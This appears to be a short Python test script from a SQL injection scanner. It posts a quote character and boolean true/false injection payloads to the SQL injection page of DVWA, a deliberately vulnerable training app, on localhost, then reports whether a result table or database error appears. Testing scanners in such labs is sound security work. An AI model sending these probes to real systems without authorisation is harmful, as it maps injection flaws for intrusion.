from scanner.sqli_scanner import build_dvwa_session

session = build_dvwa_session()
url = "http://localhost/dvwa/vulnerabilities/sqli/index.php"

for payload in ["1", "1'", "1' AND '1'='1", "1' AND '1'='2"]:
    r = session.post(url, data={"id": payload, "Submit": "Submit"},
                     timeout=10, allow_redirects=True)
    has_table = "First name" in r.text and "Surname" in r.text
    print(f"{payload!r:22}  status={r.status_code}  len={len(r.text):5}  table={has_table}")
    if "You have an error" in r.text:
        print(f"    >>> SQL ERROR VISIBLE for payload {payload!r}")